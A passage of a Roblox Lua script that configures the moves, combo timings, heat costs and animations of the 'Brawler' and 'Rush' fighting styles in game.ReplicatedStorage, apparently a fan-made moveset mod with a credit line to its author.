v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike3'
v.Name = ""2Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike1'
v.Name = ""2Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike2'
v.Name = ""2Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍2Strike4'
v.Name = ""2Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeBack'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeForward'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeLeft'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeRight'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DashAttack"") then
v = game.ReplicatedStorage.Styles.Brawler[""DashAttack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'RDashAttack'
v.Name = ""DashAttack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Distanced"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Distanced""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_Distanced""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Fisticuffs'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllRight"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllRight""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterRight'
v.Name = ""H_CounterSoloAllRight""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllLeft"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllLeft""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterLeft'
v.Name = ""H_CounterSoloAllLeft""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllFront"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterFront'
v.Name = ""H_CounterSoloAllFront""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllBack"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllBack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterBack'
v.Name = ""H_CounterSoloAllBack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding2"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_DoubleHeadCrush'
v.Name = ""H_GrabStanding2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_RunningFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_RunningFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FinishingBlow'
v.Name = ""H_RunningFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StandingBehind"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StandingBehind""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Chokehold'
v.Name = ""H_StandingBehind""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_SuperEvading"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_SuperEvading""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Rolling'
v.Name = ""H_SuperEvading""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Brawler[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'DragonTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold2'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingHandgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingHandgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperHandgun'
v.Name = ""H_GunStandingHandgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopper'
v.Name = ""H_GunStanding""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Closest"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Closest""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '50'
v.Name = ""Closest""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Distance"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Distance""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '50'
v.Name = ""Distance""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Within"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Within""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '15'
v.Name = ""Within""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""HeatUse"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""HeatUse""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = 50
v.Name = ""HeatUse""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""HeatNeeded"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""HeatNeeded""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = 'Normal'
v.Name = ""HeatNeeded""
                                                                                                                                                                                                                                                                                                                                                                                                                                                main.Heat.noheattho.Text = ""Heat Actions Disabled""
	                                                                                                                                                                                                                                                                                                                                                                                                                                            main.Heat.noheattho.Size = UDim2.new(10, 0, 1, 0)
 
	                                                                                                                                                                                                                                                                                                                                                                                                                                            menu.Bars.Mobile_Title.Text = ""Made By Duck_SillyDJ (uwu)""
	                                                                                                                                                                                                                                                                                                                                                                                                                                            menu.Bars.Mobile_Title.Visible = true
--------------------------Taunt-----------------------------------
if game.ReplicatedStorage.Moves:FindFirstChild(""DragonTaunt"") then
v = game.ReplicatedStorage.Moves[""DragonTaunt""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves)
end
v.Name = ""DragonTaunt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dmg""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0
v.Name = ""Dmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HitboxLocations"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HitboxLocations""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = '[[""RightHand"",3,[0,-1,0]],[""RightLowerArm"",1.5,[0,0,0]],[""RightUpperArm"",1,[0,0,0]]]'
v.Name = ""HitboxLocations""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.225
v.Name = ""AniSpeed""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Sound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Sound""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 'FakeLaugh'
v.Name = ""Sound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""NoDmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""NoDmg""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""NoDmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.15
v.Name = ""HeatAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatGain"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatGain""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 100
v.Name = ""HeatGain""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""ForceSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""ForceSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""ForceSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""TauntSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""TauntSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""TauntSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""EndAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""EndAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.8
v.Name = ""EndAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves.DragonTaunt)
end

v.AnimationId = ""rbxassetid://10928237540""
v.Name = ""Anim""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveForward"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveForward""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 2
v.Name = ""MoveForward""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveStart2"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveStart2""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.8
v.Name = ""MoveStart2""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveDuration"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveDuration""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.4
v.Name = ""MoveDuration""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dragon"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dragon""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Dragon""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Cancelable"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Cancelable""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Cancelable""
if game.ReplicatedStorage.Moves[""龍Attack1""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack1""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack1""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack2""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack2""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack2""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack3""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack3""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack3""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Attack4""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Attack4""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Attack4""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""龍Strike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""龍Strike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""龍Strike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""BStrike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""BStrike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""BStrike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Styles:FindFirstChild(""Rush"") then
v = game.ReplicatedStorage.Styles[""Rush""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Rush""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunning"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunning""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Reversal'
v.Name = ""H_Stunning""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Rush[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://10848090844""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Rush[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RushTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Rush[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 1.2
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Rush[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = Color3.fromRGB(255,0,255)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Rush[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Rush'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Rush[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_CrushingWall'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Rush[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RSweep'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Rush[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FrenzySpinCounter'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FlyingKick'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush5"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush6"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush7"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush8"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack4'
v.Name = ""Rush8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike1'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Strike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike6"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike4'
v.Name = ""Strike6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike7"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike4'
v.Name = ""Strike7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike8"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike3'
v.Name = ""Strike8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike9"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike9""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike4'
v.Name = ""Strike9""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_AirFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_AirFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Whirl'
v.Name = ""H_AirFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Rush[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'T_CounterQuickstep'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Rush.GrabStrike:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Rush.GrabStrike[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush.GrabStrike)
end
v.Value = 'Counter Quickstep'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Rush[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710466763""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeL""]
else
